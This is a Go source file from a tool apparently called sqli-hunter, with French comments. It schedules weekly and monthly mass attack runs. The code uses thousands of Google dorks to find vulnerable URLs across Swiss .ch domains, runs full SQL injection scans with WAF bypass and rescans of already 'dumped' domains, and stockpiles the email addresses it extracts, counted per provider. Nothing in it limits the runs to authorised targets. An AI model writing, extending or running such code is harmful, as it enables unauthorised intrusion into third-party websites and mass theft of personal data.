package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/sqli-hunter/sqli-hunter/internal/discover"
	"github.com/sqli-hunter/sqli-hunter/internal/notify"
	"github.com/sqli-hunter/sqli-hunter/internal/output"
	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

// runBig lance une grosse passe hebdo (alias weekly).
func runBig(args []string) {
	runBigTier(discover.BigTierWeekly, args)
}

// runWeekly — max vulns + emails chaque semaine.
func runWeekly(args []string) {
	runBigTier(discover.BigTierWeekly, args)
}

// runMonthly — max vulns + emails chaque mois (encore plus large).
func runMonthly(args []string) {
	runBigTier(discover.BigTierMonthly, args)
}

func runBigTier(tier discover.BigTier, args []string) {
	cfg, err := parseBigTierArgs(tier, args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "erreur: %v\n", err)
		os.Exit(1)
	}

	label, scopeFile := bigTierLabel(tier)
	printer := output.New(cfg.noColor, cfg.verbose)
	printer.Header(version)
	printer.KV("mode", label+" — max vulns + emails (.ch)")
	printer.KV("discover", "6525+ dorks vuln + DBMS/WAF")
	printer.KV("limit", discoverLimitLabel(cfg.discoverLimit))
	printer.KV("threads", fmt.Sprintf("scan %d · urls %d · extract %d", cfg.threads, cfg.urlConcurrency, cfg.extractThreads))
	printer.KV("scan", "full + waf + rescan domaines dumpés")
	printer.KV("output", cfg.outputDir+"/emails/")
	printer.Rule()
	fmt.Println()

	n := notify.Default()
	notify.BoardLaunch(n)
	_ = results.WriteRunStatus(cfg.outputDir, results.RunStatus{Phase: bigPhaseName(tier)})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		printer.Warning("interruption")
		cancel()
	}()

	cfg.discoverDomain = "ch"
	cfg.discoverSource = "google"
	cfg.discoverSubs = true
	cfg.discoverOutput = filepath.Join(cfg.outputDir, scopeFile)
	cfg.skipScanned = false
	cfg.rescan = true
	cfg.allowEmptyDiscover = true
	cfg.bigScan = true
	cfg.bigTier = tier
	cfg.scanAfterDiscover = true

	scopePath, count, err := discoverURLs(ctx, cfg, printer)
	if err != nil {
		if n.Enabled() {
			n.Error("Discover " + label + ": " + err.Error())
		}
		printer.Error(err.Error())
		os.Exit(1)
	}
	if count == 0 {
		printer.Warning("Aucune URL sur cette passe — curseur avancé pour la prochaine")
		printEmailStock(printer, cfg.outputDir)
		return
	}

	cfg.listFile = scopePath
	applyMassDefaultsToConfig(&cfg, count)
	cfg.massMode = true
	if cfg.progressEvery <= 0 {
		cfg.progressEvery = 200
	}

	if err := executeScan(ctx, cfg, printer); err != nil {
		if n.Enabled() {
			n.Error("Scan " + label + ": " + err.Error())
		}
		printer.Error(err.Error())
		os.Exit(1)
	}

	printEmailStock(printer, cfg.outputDir)
}

func printEmailStock(printer *output.Printer, outputDir string) {
	list, err := results.ListProviders(outputDir)
	if err != nil || len(list) == 0 {
		return
	}
	printer.Rule()
	fmt.Println()
	printer.KV("stock emails", "")
	for _, p := range list {
		fmt.Printf("  • %s — %d\n", p.Provider, p.Count)
	}
}

func bigTierLabel(tier discover.BigTier) (label, scope string) {
	switch tier {
	case discover.BigTierMonthly:
		return "monthly", "scope_monthly.txt"
	default:
		return "weekly", "scope_weekly.txt"
	}
}

func bigPhaseName(tier discover.BigTier) string {
	switch tier {
	case discover.BigTierMonthly:
		return "monthly"
	default:
		return "weekly"
	}
}

func parseBigTierArgs(tier discover.BigTier, args []string) (config, error) {
	urlThreads := "128"
	extractThreads := "8"
	scanThreads := "16"
	progressEvery := "500"
	if tier == discover.BigTierWeekly {
		urlThreads = "96"
		extractThreads = "6"
		scanThreads = "12"
		progressEvery = "200"
	}
	scanArgs := append([]string{
		"-D", "ch", "--mass", "--full", "--waf", "--rescan",
		"-t", "sqli,error,union,boolean,time",
		"--url-threads", urlThreads,
		"--threads", scanThreads,
		"--extract-threads", extractThreads,
		"--progress-every", progressEvery,
	}, args...)
	cfg, err := parseArgs(scanArgs)
	if err != nil {
		return cfg, err
	}
	cfg.discoverLimit = 0
	return cfg, nil
}

func discoverLimitLabel(n int) string {
	if n <= 0 {
		return "illimité"
	}
	return fmt.Sprintf("%d urls", n)
}
